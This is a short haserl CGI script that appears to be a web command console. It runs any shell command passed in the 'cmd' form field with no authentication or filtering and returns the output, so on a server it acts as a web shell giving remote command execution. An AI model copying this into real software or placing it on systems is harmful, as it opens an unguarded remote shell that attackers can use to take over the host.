#!/usr/bin/haserl
Content-type: text/plain

<%
cd /tmp
cmd="$FORM_cmd"
export PATH=/usr/local/bin:/usr/local/sbin:/bin:/sbin:/usr/bin:/usr/sbin

echo "<b>[$(whoami)@$(hostname) $PWD]# $cmd</b>\n"
[ -n "$cmd" -a "$cmd" != "undefined" ] && result=$($cmd 2>&1)
[ -z "$result" ] && echo "- empty -" || echo "$result"
%>
